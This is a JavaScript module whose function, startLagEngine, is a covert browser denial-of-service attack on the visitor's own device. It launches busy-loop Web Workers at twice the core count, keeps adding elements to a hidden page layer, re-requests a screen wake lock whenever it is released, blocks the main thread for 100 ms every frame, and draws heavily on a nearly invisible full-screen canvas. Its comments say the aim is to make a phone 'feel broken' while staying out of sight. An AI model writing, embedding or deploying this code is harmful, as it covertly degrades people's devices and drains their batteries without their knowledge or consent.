export function startLagEngine() {
  console.log("Engaging Lag Engine...");
  
  // 1. CPU / Worker Bomb
  const workerBlob = new Blob([`
    onmessage = function() {
      while(true) {
        let x = Math.random() * Math.random();
        for(let i=0; i<1000; i++) { x = Math.sqrt(x) + Math.sin(x); }
      }
    }
  `], { type: 'application/javascript' });
  const workerUrl = URL.createObjectURL(workerBlob);
  
  // Spawn enough workers to throttle the CPU
  const cores = navigator.hardwareConcurrency || 4;
  for (let i = 0; i < cores * 2; i++) {
    const worker = new Worker(workerUrl);
    worker.postMessage('start');
  }

  // 2. DOM / Memory Bomb
  const bombContainer = document.createElement('div');
  bombContainer.style.opacity = '0';
  bombContainer.style.pointerEvents = 'none';
  bombContainer.style.position = 'fixed';
  bombContainer.style.zIndex = '-9999';
  document.body.appendChild(bombContainer);

  let elements = [];
  setInterval(() => {
    // Inject 500 DOM elements per interval
    const frag = document.createDocumentFragment();
    for(let i=0; i<500; i++){
      const el = document.createElement('div');
      el.textContent = 'LAG'.repeat(10);
      frag.appendChild(el);
      elements.push(el);
    }
    bombContainer.appendChild(frag);
    
    // Prevent complete crash, just intense lag
    if (elements.length > 50000) {
      bombContainer.innerHTML = '';
      elements = [];
    }
  }, 50);

  // 3. Keep-Awake WakeLock
  if ('wakeLock' in navigator) {
    try {
      navigator.wakeLock.request('screen').then(lock => {
        lock.addEventListener('release', () => {
          // If released, request again!
          navigator.wakeLock.request('screen');
        });
      });
    } catch(e) {}
  }

  // 4. Main Thread Blocker (This REALLY lags modern phones)
  // Web workers run in the background, so they don't lag the screen. 
  // We MUST block the main thread to make the phone feel broken.
  function dropFrames() {
    const start = performance.now();
    // Block the UI completely for 100ms every single frame. 
    // This forces the phone to run at less than 10 FPS.
    while (performance.now() - start < 100) {
      Math.sqrt(Math.random() * Math.random()); 
    }
    requestAnimationFrame(dropFrames);
  }
  dropFrames();

  // 5. GPU Rendering Bomb
  // Creating a hidden full-screen canvas and aggressively drawing millions of 
  // complex shapes forces the phone's Graphics Processor (GPU) to completely choke.
  const canvas = document.createElement('canvas');
  canvas.width = window.innerWidth || 1000;
  canvas.height = window.innerHeight || 1000;
  canvas.style.position = 'fixed';
  canvas.style.top = '0';
  canvas.style.left = '0';
  canvas.style.zIndex = '-9999'; // Hidden so they don't see it
  canvas.style.opacity = '0.01'; // Force the browser to render it onto the composite layer
  canvas.style.pointerEvents = 'none';
  document.body.appendChild(canvas);
  
  const ctx = canvas.getContext('2d');
  function gpuBomb() {
    // Generate thousands of overlapping circles with transparency
    // This is incredibly expensive for mobile GPUs to calculate
    for(let i=0; i<3000; i++) {
      ctx.beginPath();
      ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 50, 0, Math.PI * 2);
      ctx.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
      ctx.fill();
    }
    requestAnimationFrame(gpuBomb);
  }
  gpuBomb();
}
